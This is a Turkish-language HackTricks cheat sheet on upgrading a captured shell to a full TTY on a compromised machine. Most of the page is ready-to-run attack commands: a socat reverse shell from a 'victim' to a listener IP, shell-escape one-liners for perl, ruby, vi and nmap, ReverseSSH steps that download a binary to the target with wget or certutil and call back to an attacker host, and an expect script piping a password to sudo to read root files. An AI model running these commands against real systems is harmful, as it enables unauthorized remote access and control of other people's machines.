# Tam TTY'ler

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Tam TTY

`SHELL` değişkeninde ayarladığınız kabuk **mutlaka** _**/etc/shells**_ içinde **listelenmiş olmalıdır** veya `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` hatası alırsınız. Ayrıca, aşağıdaki kod parçalarının sadece bash'te çalıştığını unutmayın. Eğer zsh kullanıyorsanız, kabuğu elde etmeden önce `bash` komutunu çalıştırarak bash'e geçin.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
**`stty -a`** komutunu çalıştırarak **satır** ve **sütun** sayısını alabilirsiniz.
{% endhint %}

#### betik

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat

Socat, birçok farklı ağ protokolünü destekleyen bir veri iletişim programıdır. Bu program, TCP/IP, UDP, SSL, IPv6 ve daha birçok protokolü destekler. Socat, birçok farklı kullanım senaryosunda kullanılabilir ve birçok farklı işlevi yerine getirebilir. Bu nedenle, bir hedef sistemde tam bir TTY kabuğu oluşturmak için kullanılabilir.

Socat kullanarak tam bir TTY kabuğu oluşturmak için aşağıdaki komutu kullanabilirsiniz:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<port>
```

Bu komut, belirtilen bağlantı noktasını dinleyen bir TCP soketi oluşturur ve gelen bağlantıları yerel bir TTY'ye yönlendirir. Bu sayede, hedef sistemde tam bir TTY kabuğu elde edebilirsiniz.

Socat'ı kullanarak tam bir TTY kabuğu oluşturmak, hedef sistemdeki birçok işlemi gerçekleştirmenizi sağlar. Bu sayede, hedef sistemdeki dosyaları okuyabilir, yazabilir ve değiştirebilir, komutlar çalıştırabilir ve hedef sistemdeki diğer ağ servislerine erişebilirsiniz.
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Kabuk Oluşturma**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Hedefe **etkileşimli kabuk erişimi**, **dosya transferleri** ve **port yönlendirmesi** için uygun bir yol, ReverseSSH adlı statik olarak bağlanmış ssh sunucusunu hedefe bırakmaktır.

Aşağıda, upx sıkıştırılmış ikili dosyalarla birlikte `x86` için bir örnek bulunmaktadır. Diğer ikili dosyalar için [sürümler sayfasına](https://github.com/Fahrj/reverse-ssh/releases/latest/) bakın.

1. Yerel olarak ssh port yönlendirme isteğini yakalamak için hazırlık yapın:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Linux hedefi:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 hedefi (daha önceki sürümler için, [proje readme](https://github.com/Fahrj/reverse-ssh#features)'ye bakın):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* Eğer ReverseSSH port yönlendirme isteği başarılı olduysa, şimdi `reverse-ssh(.exe)` çalıştıran kullanıcının bağlamında varsayılan şifre olan `letmeinbrudipls` ile giriş yapabilirsiniz:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## TTY Yok

Bazı nedenlerle tam bir TTY elde edemiyorsanız, kullanıcı girişi bekleyen programlarla hala etkileşimde bulunabilirsiniz. Aşağıdaki örnekte, şifre bir dosyayı okumak için `sudo`'ya iletilir:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
